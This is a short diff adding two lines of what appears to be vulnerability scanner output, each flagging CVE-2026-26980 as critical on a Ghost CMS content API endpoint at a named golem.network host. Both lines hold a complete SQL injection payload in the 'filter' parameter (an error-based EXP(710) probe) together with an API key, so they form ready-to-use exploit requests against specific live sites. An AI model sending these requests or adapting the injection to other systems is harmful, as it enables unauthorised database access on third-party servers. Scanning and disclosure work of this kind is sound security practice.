@@ -1,0 +1,2 @@
+[CVE-2026-26980] [http] [critical] https://geth.golem.network/ghost/api/content/tags/?key=16eb5917a0f29f5cad26aacf5b&filter=slug:['||CASE+WHEN+1=0+THEN+0+ELSE+EXP(710)+END||',hash-aleksandra-2]
+[CVE-2026-26980] [http] [critical] https://geth2.golem.network/ghost/api/content/tags/?key=16eb5917a0f29f5cad26aacf5b&filter=slug:['||CASE+WHEN+1=0+THEN+0+ELSE+EXP(710)+END||',hash-aleksandra-2]
